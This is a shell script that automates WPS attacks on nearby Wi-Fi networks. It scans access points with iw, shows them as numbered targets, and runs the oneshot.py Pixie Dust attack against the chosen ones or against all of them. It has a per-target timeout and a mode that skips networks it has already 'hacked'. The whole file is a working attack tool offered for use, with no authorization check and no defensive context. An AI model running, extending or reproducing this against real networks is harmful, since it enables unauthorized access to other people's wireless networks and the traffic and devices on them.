#!/bin/sh

#Help function
usage()
{
	echo "Usage: $(basename $0) [options]"
	echo -e "-t <time>      \tScan timeout in seconds"
	echo -e "-i <interface> \tInterface name"
	echo -e "-a             \tAttack all targets"
	echo -e "-n             \tAttack only new targets"
	echo -e "-S             \tShow stored networks"
	echo -e "-h             \tShow this help"
	exit
}

showStored()
{
	awk -f stored.awk reports/stored.txt | sort | uniq -i
	exit
}

fillArr()
{
	INPUT="$1"

	for ELEMENT in "$INPUT"
	do
		echo -n "$ELEMENT "
	done
}

#Scanning networks and parsing output via awk scipt
scanNetworks()
{
	iw dev $IFACE scan |\
	awk -v iface="$IFACE)" -f wifi.awk |\
	sed --expression='s/(on//g' |\
	sed --expression='s/.00//g' |\
	sort -k 3
}

#Setting default values
IFACE="wlan0"

#Parsing script arguments
while getopts "t:i:hanS" opt
do
	case $opt in
		t)
			TIMEOUT=${OPTARG};;
		i)
			IFACE=${OPTARG};;
		a)
			ALL="1";;
		n)
			NEW="1";;
		S)
			showStored;;
		h)
			usage;;
		*)
			usage;;
	esac
done

#Filling corresponding arrays with stored networks mac/name
if [ $NEW ]
then
	if [ -d reports ]
	then
		#Getting stored networks info
		OLD=$(awk -f stored.awk reports/stored.txt |\
			sort | uniq -i)
		OLD_BSSIDS=($(fillArr "$(echo "$OLD" | awk '{print $1}')"))
		OLD_ESSIDS=($(fillArr "$(echo "$OLD" | awk '{print $2}')"))
		OLD_SIGNAL=($(fillArr "$(echo "$OLD" | awk '{print $3}')"))
	else
		echo "[-] No saved networks found!"
	fi
fi

#Preparation loop
while true
do
	clear
	echo "[*] Scanning networks around..."
	#Getting list of targets
	TARGETS=$(scanNetworks)

	#Checking, if networks with WPS were found
	if [ "$TARGETS" ]
	then
		echo "[+] Found targets:"
	else
		echo "[-] No targets found"
		exit
	fi

	#Filling BSSIDS array with MAC addresses
	BSSIDS=($(fillArr "$(echo "$TARGETS" | awk '{print $1}')"))

	#Filling ESSIDS array with networks names
	ESSIDS=($(fillArr "$(echo "$TARGETS" | awk '{print $2}')"))

	#Filling SIGNALS array with signal level
	SIGNALS=($(fillArr "$(echo "$TARGETS" | awk '{print $3}')"))

	#Skipping already stored networks
	if [ $NEW ]
	then
		for BSSID in ${!BSSIDS[@]}
		do
			for OLD_BSSID in ${!OLD_BSSIDS[@]}
			do
				if [ " ${BSSIDS[$BSSID]}" = " ${OLD_BSSIDS[$OLD_BSSID]}" ]
				then
					unset 'BSSIDS[$BSSID]'
					REMOVED=$((REMOVED+1))
				fi
			done
		done
	fi

	#Displaying to user scan results
	echo -e "[№]\tPower\tBSSID\t\t\tESSID"
	for TARGET in ${!BSSIDS[@]}
	do
		echo -e "[$((${TARGET}+1))]\t${SIGNALS[$TARGET]} db\t${BSSIDS[$TARGET]}\t${ESSIDS[$TARGET]}"
	done

	#Prompting user for set of targets from scan result
	if [ ! $ALL ]
	then
		if [ $NEW ] && [ $REMOVED ]
		then
			echo "[!] Viewing only not hacked networks"
			echo "[!] Removed $REMOVED entries"
		fi
		echo -n "[*] Choose targets to attack (space separated) or 'all'. Type 'r' to rescan networks: "
		read CHOSEN
	fi

	if [ "$CHOSEN" = "r" ]
	then
		continue
	fi

	#Hail Mary
	if [ "$CHOSEN" = "all" ] || [ $ALL ]
	then
		if [ $NEW ] && [ $REMOVED ]
		then
			echo "[!] Viewing only not hacked networks"
			echo "[!] Removed $REMOVED entries"
		fi
		echo "[*] Attacking all targets!"
		CHOSEN=${!BSSIDS[@]}
		ALL="1"
	fi

	break
done

if [ ! $TIMEOUT ]
then
	echo -n "[*] Set timeout for each target (0 - no timeout) [30]: "
	read TIMEOUT
	if [ ! $TIMEOUT ]
	then
		TIMEOUT=30
	fi
fi

#Main loop
for TARGET in $CHOSEN
do
	#Adjusting array indexes from user input
	if [ ! $ALL ]
	then
		TARGET=$(($TARGET-1))
	fi

	#Calling oneshot with target bssid
	echo
	echo "[+] Shooting ${BSSIDS[$TARGET]} - ${ESSIDS[$TARGET]}"
	python oneshot.py --bssid ${BSSIDS[$TARGET]} -K -F -i $IFACE -w 2>/dev/null || true && killall sleep 2> /dev/null &

	#Starting timeout timer
	if [ $TIMEOUT -gt 0 ]
	then
		sleep $TIMEOUT > /dev/null && echo "[-] Timeout!"
		PIDS="1"
		while [ "$PIDS" ]
		do
			#Killing oneshot proccess, that's hang
			PIDS=$(ps -ux | grep oneshot.py | grep -v grep | awk '{print $2}')
			for PID in $PIDS
			do
				kill -9 $PID > /dev/null
				echo "[*] Killed oneshot process"
			done
			sleep 1
		done
	fi

	wait
done

echo "[*] Jobs done!"
